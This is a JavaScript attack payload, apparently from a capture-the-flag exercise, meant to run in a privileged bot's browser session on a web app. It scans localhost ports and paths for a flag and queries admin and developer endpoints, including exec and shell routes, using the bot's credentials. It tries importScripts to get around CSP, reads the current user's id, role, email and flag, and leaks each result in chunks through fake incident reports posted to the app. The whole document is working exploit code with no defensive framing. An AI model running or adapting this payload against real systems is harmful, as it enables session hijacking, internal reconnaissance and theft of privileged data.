// Probe: try localhost/internal services + re-examine admin audit
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  await P('P5|START|' + O);

  // 1. Try localhost ports for internal services
  var ports = [3000, 8080, 80, 5000, 8000, 4000, 9000, 1337, 3001];
  for (var i = 0; i < ports.length; i++) {
    try {
      var r = await fetch('http://localhost:' + ports[i] + '/flag', {mode: 'no-cors'});
      await P('P5|PORT|' + ports[i] + '|' + r.status + '|' + r.type);
    } catch(e) {
      // no-cors doesn't give us content. Try cors mode
      try {
        var r2 = await fetch('http://localhost:' + ports[i] + '/flag');
        var t = await r2.text();
        await P('P5|PORTC|' + ports[i] + '|' + r2.status + '|' + t.slice(0, 60));
      } catch(e2) {
        await P('P5|PORTF|' + ports[i] + '|' + String(e2).slice(0, 60));
      }
    }
  }

  // 2. Try localhost with various flag paths
  var paths = ['/flag', '/flag.txt', '/api/flag', '/cat', '/api/cat', '/', '/etc/flag'];
  for (var j = 0; j < paths.length; j++) {
    try {
      var r = await fetch('http://localhost:3000' + paths[j]);
      var t = await r.text();
      await P('P5|LOCAL|' + paths[j] + '|' + r.status + '|' + t.slice(0, 60));
    } catch(e) {}
  }

  // 3. Check what this bot can access that we can't
  var eps = [
    '/api/admin/audit', '/api/admin/audit?log=2', '/api/admin/users',
    '/api/escalations', '/api/reports',
    '/api/developer/diagnostics', '/api/developer/tools',
    '/api/developer/audit', '/api/developer/system',
    '/api/developer/exec', '/api/developer/shell',
    '/api/developer/cat', '/api/developer/flag',
    '/api/system/flag', '/api/cat', '/flag',
  ];
  for (var k = 0; k < eps.length; k++) {
    try {
      var r = await fetch(O + eps[k], {credentials: 'same-origin'});
      var t = await r.text();
      if (r.status === 200) {
        await P('P5|EP|' + eps[k] + '|' + r.status + '|' + t.slice(0, 55));
      } else if (r.status !== 404 && r.status !== 403) {
        await P('P5|EP|' + eps[k] + '|' + r.status);
      }
    } catch(e) {}
  }

  // 4. Try importScripts from localhost (bypasses CSP?)
  try {
    importScripts('http://localhost:3000/flag');
    await P('P5|IMPORT|localhost:3000/flag|ok');
  } catch(e) {
    await P('P5|IMPORT|localhost:3000/flag|' + String(e).slice(0, 60));
  }

  // 5. Re-read audit entry 2 via developer (even though it failed before as 403)
  // Try without /api prefix
  try {
    var r = await fetch(O + '/admin/audit?log=2', {credentials: 'same-origin'});
    await P('P5|AUDIT2|' + r.status + '|' + (await r.text()).slice(0, 60));
  } catch(e) {}

  // 6. Check /api/me for developer flag (full, not truncated)
  try {
    var r = await fetch(O + '/api/me', {credentials: 'same-origin'});
    var j = await r.json();
    var u = j.user || {};
    await P('P5|ME|' + u.id + '|' + u.role + '|' + u.email);
    var f = u.flag || 'none';
    // Split flag into chunks to avoid truncation
    for (var c = 0; c < f.length; c += 80) {
      await P('P5|FL|' + Math.floor(c/80) + '|' + f.slice(c, c+80));
    }
  } catch(e) {}

  await P('P5|DONE');
})();
